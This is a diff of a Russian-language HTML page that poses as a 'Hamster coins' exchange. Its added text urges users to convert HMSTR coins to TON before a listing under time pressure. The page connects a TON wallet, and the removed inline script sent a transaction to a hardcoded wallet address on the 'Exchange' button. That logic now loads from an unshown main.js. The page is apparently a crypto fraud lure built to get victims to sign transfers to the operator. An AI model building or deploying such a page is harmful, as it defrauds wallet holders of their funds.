@@ -8,9 +8,26 @@
     <title>Hamster</title>
 </head>
 <body>
+    <div class="top_image_con">
+        <div class="top_image"></div>
+    </div>
     <div class="container">
-        <div>
-            <h1>TON SPACE KEEPER</h1>
+        <div class="text" style="text-align: center;">
+            <div class="text1">
+                <h1>Обмен Hamster coins</h1>
+            </div>
+            <div class="text2">
+                <p class="p_text">Конвертируйте ваши монеты HMSTR до листинга и получите максимальную выгоду. Предложение ограничено по времени! После листинга цена будет ниже,не упустите шанс!</p>
+            </div>
+        </div>
+        <div class="convert_con">
+            <label class="convert_label">Отдаёте:</д>
+            <input type="number" class="convert_input" id="inputAmount" placeholder="Введите сумму HMSTR">
+            <label style="display: block; padding-top: 20px;">Получаете:</label>
+            <div class="result_con">
+                <span id="result" class="convert_result"></span> <label class="TON">TON</label>
+            </div>
+            <p class="result_p">Комиссия обмена ~0.2 TON</p>
         </div>
         <div class="button_container">
             <div id="ton-connect" class="button"></div>
@@ -19,45 +36,9 @@
             <div class="send_button button" onclick="transaction()">🐹 Обменять</div>
         </div>
     </div>  
-    <script>
-        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-            manifestUrl: 'https://sumisufk.github.io/ton-keeper/tonconnect-manifest.json',
-            buttonRootId: 'ton-connect'
-        });
-
-        function showExchangeButton() {
-            document.querySelector('.send_button_cont').style.display = 'flex';
-        }
-
-        function hideExchangeButton() {
-            document.querySelector('.send_button_cont').style.display = 'none';
-        }
-
-        tonConnectUI.onStatusChange(wallet => {
-            if (wallet) {
-                showExchangeButton();
-            } else {
-                hideExchangeButton();
-            }
-        });
-
-        async function transaction() {
-            const transaction = {
-                validUntil: Math.round(Date.now() / 1000) + 10,
-                messages: [
-                    {
-                        addres: "UQDAxpTgVTh2HmRijcLxCT7YKyp9cmTxP6S0VhuijIkRG_uZ",
-                        amount: '20'
-                    }
-                ]
-            };
-
-            try {
-                await tonConnectUI.sendTransaction(transaction);
-            } catch (e) {
-                console.error(e);
-            }
-        }
-    </script>
+    <div class="bottom_img_con">
+        <div class="bottom_img"></div>
+    </div>
+    <script src="main.js"></script>
 </body>
 </html>
